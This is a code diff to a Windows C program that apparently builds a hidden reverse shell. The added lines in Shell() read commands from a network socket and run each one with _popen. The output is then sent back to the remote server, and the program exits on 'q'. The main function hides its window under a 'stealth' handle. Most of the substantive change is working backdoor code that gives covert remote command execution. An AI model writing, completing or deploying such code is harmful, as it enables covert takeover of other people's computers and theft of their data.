@@ -29,11 +29,10 @@
    nCmdShow: flag for main application window state (minimized, maximized or normal)
 ***/
 
-// global vars
+//====== Global Variables =======//
 int sock;
 
-
-// Shell function
+//============ Shell ============//
 void Shell() {
     char buffer[1024];
     char container[1024];
@@ -46,10 +45,32 @@ void Shell() {
 		bzeroWin(total_response, sizeof(total_response));
         // receive variables
         recv(sock, buffer, 1024, 0);
+
+        // q - quit the connection
+        if (strncmp("q", buffer, 1) == 0) {
+			closesocket(sock);
+			WSACleanup();
+			exit(0);
+		} else {
+			FILE *fd;
+            // Create a pipe and execute a command asynchronously.
+			fd = _popen(buffer, "r");
+
+            // store first 1024 bytes of resonse in container
+            // when response exceeds 1024 bytes, add container to total_resonse
+			while(fgets(container, 1024, fd) != NULL) {
+				strcat(total_response, container);
+			}
+
+            // send response to server
+			send(sock, total_response, sizeof(total_response), 0);
+			// close file descriptor
+            fclose(fd);
+		}
     }
 }
 
-// Main function
+//============ Main ============//
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
     // hide the window
     HWND stealth;
